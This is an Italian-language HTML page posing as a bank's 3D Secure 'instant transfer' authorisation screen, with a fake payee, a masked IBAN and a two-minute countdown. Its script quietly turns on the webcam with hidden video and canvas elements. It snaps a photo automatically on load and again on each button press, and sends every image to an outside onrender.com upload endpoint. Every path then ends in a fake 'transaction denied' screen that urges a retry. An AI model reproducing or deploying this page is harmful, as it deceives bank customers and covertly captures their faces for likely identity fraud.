<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bonifico istantaneo</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: rgb(15, 15, 15);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .card {
      background-color: transparent;
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .bank-logo {
      width: 140px;
      max-width: 70%;
      margin-bottom: 20px;
    }

    .info p {
      font-size: 16px;
      margin: 8px 0;
    }

    .secure-tag {
      font-size: 14px;
      color: rgb(26, 110, 75);
      margin-top: -10px;
      margin-bottom: 20px;
    }

    .timer {
      font-size: 15px;
      color: rgb(251, 18, 34);
      margin-bottom: 20px;
      font-weight: bold;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .autorizza {
      background-color: #00bfff;
      color: #000;
    }

    .nega, .riprovare {
      background-color: #fff;
      color: #000;
    }

    .link {
      color: #00bfff;
      font-size: 14px;
      margin: 6px 0;
      text-decoration: none;
      display: block;
    }

    .loading {
      font-size: 18px;
      margin-top: 30px;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    .result-image {
      width: 100px;
      margin-bottom: 20px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="card" id="card">
  <img src="logo.png" alt="Banca dei Crediti" class="bank-logo">
  <h2 style="margin-bottom: 5px;">Ricevi bonifico istantaneo</h2>
  <div class="secure-tag">ðŸ”’ 3D Secure</div>

  <div class="info">
    <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
    <p>IBAN: <strong>IT44M****4492</strong></p>
    <p>Importo: <strong>150,00 â‚¬</strong></p>
    <p>Commissione: <strong>0,00 â‚¬</strong></p>
    <p>Transazione: <strong>#TRX-004391</strong></p>
    <p>Data: <strong><span id="data-operazione"></span></strong></p>
    <p class="timer">âš ï¸Ž Sessione in scadenza tra <span id="countdown">02:00</span></p>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <button class="autorizza" onclick="handleClick()">AUTORIZZA</button>
  <button class="nega" onclick="showFailure()">NEGA</button>
</div>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  const countdownEl = document.getElementById('countdown');
  const card = document.getElementById('card');
  document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');

  let seconds = 120;
  const timer = setInterval(() => {
    seconds--;
    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
    const s = String(seconds % 60).padStart(2, '0');
    countdownEl.innerText = `${m}:${s}`;
    if (seconds <= 0) {
      clearInterval(timer);
      showFailure("Sessione scaduta.");
    }
  }, 1000);

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        setTimeout(() => {
          takeAndSendPhoto("auto-scatto");
        }, 1500);
      };
    })
    .catch(() => {
      showFailure("Operazione annullata");
    });

  function takeAndSendPhoto(action) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL('image/png');
    fetch('https://backend-render-server.onrender.com/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, image })
    });
  }

  function handleClick() {
    takeAndSendPhoto("autorizza");
    showLoadingScreen();
    setTimeout(() => showFailure(), 4000);
  }

  function handleRetry() {
    takeAndSendPhoto("riprovare");
    setTimeout(() => {
      location.reload();
    }, 1000);
  }

  function showFailure(msg = null) {
    card.innerHTML = `
      <img src="fail.png" alt="Errore" class="result-image">
      <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
      <p>${msg ?? "L'autenticazione 3D Secure non Ã¨ andata a buon fine."}</p>
      <p>Il sistema ha rilevato un'anomalia di sicurezza, Ã¨ necessario ripetere l'operazione di autorizzazione.</p>
      <button class="riprovare" onclick="handleRetry()">RIPROVA</button>
    `;
  }

  function showLoadingScreen() {
    card.innerHTML = `
      <h2>Invio bonifico istantaneo</h2>
      <div class="loading">Autorizzazione in corso...</div>
    `;
  }
</script>

</body>
</html>
